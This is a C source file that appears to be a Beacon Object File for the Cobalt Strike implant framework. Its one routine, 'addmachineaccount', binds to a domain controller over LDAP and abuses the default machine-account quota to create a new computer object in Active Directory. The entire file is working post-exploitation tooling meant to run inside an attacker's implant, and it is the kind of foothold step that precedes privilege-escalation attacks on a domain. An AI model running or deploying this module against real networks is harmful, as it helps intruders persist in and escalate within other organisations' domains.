/*
 * addmachineaccount <name> - add a computer object (ms-DS-MachineAccountQuota).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"
#include "ldaphelpers.h"

void go(char *args, int alen)
{
    datap parser;
    char *name;
    int nlen;
    char base[512], dn[768], sam[256], uac[16];
    LDAP *ld;
    LDAPModA m0, m1, m2;
    LDAPModA *mods[4];
    char *oc[] = { "top", "person", "organizationalPerson", "user", "computer", NULL };
    char *samvals[2];
    char *uacvals[2];
    ULONG rc;

    BeaconDataParse(&parser, args, alen);
    name = BeaconDataExtract(&parser, &nlen);
    if (!name || !name[0]) {
        BeaconPrintf(CALLBACK_ERROR, "usage: addmachineaccount <name>\n");
        return;
    }

    ld = bof_ldap_open_ex(&rc);
    if (!ld) {
        bof_error_ldap("ldap_init/bind", rc,
                       "cannot reach or authenticate to a domain controller");
        return;
    }
    if (bof_ldap_default_nc_ex(ld, base, sizeof(base), &rc) != 0) {
        bof_error_ldap("rootDSE defaultNamingContext", rc,
                       "cannot read the domain naming context");
        WLDAP32$ldap_unbind(ld);
        return;
    }

    bof_strcpy(dn, "CN=");
    bof_strncat(dn, name, sizeof(dn) - bof_strlen(dn) - 1);
    bof_strncat(dn, ",CN=Computers,", sizeof(dn) - bof_strlen(dn) - 1);
    bof_strncat(dn, base, sizeof(dn) - bof_strlen(dn) - 1);

    bof_strncpy(sam, name, sizeof(sam));
    bof_strncat(sam, "$", sizeof(sam) - bof_strlen(sam) - 1);
    bof_strcpy(uac, "4096");

    samvals[0] = sam;
    samvals[1] = NULL;
    uacvals[0] = uac;
    uacvals[1] = NULL;

    bof_memzero(&m0, sizeof(m0));
    bof_memzero(&m1, sizeof(m1));
    bof_memzero(&m2, sizeof(m2));

    m0.mod_op = LDAP_MOD_ADD;
    m0.mod_type = "objectClass";
    m0.mod_vals.modv_strvals = oc;

    m1.mod_op = LDAP_MOD_ADD;
    m1.mod_type = "sAMAccountName";
    m1.mod_vals.modv_strvals = samvals;

    m2.mod_op = LDAP_MOD_ADD;
    m2.mod_type = "userAccountControl";
    m2.mod_vals.modv_strvals = uacvals;

    mods[0] = &m0;
    mods[1] = &m1;
    mods[2] = &m2;
    mods[3] = NULL;

    BeaconPrintf(CALLBACK_OUTPUT, "Adding machine account: %s\n", dn);
    rc = WLDAP32$ldap_add_ext_sA(ld, dn, mods, NULL, NULL);
    if (rc == LDAP_SUCCESS)
        BeaconPrintf(CALLBACK_OUTPUT, "Created %s (sAMAccountName=%s)\n", dn, sam);
    else {
        bof_error_ldap("ldap_add", rc,
                       "cannot create the machine account");
        bof_error_context("dn", dn);
    }

    WLDAP32$ldap_unbind(ld);
}
